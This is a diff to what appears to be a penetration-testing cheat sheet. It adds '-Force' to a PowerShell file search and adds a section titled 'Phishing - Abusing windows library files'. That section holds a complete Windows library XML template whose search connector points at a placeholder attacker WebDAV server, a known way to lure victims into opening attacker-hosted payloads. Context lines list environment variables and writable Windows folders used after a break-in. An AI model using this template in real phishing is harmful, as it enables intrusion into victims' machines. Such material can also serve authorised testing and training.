@@ -3884,7 +3884,7 @@ Get-ChildItem Env: | ft Key,Value
 
 ##### Search for files
 ```c
-dir . -filter "*.txt" -Recurse | ? {(gc $_.FullName | Measure -Line | Select -Expand Lines) -gt 100 }
+dir . -filter "*.txt" -Recurse -Force | ? {(gc $_.FullName | Measure -Line | Select -Expand Lines) -gt 100 }
 ```
 
 ##### SMB List Shares
@@ -3914,6 +3914,29 @@ C:\Windows\SysWOW64\FxsTmp
 C:\Windows\SysWOW64\com\dmp
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+```
+
+##### Phishing - Abusing windows library files
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>WEBDAV_SERVER_IP</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
 ```
 
 ##### accesschk
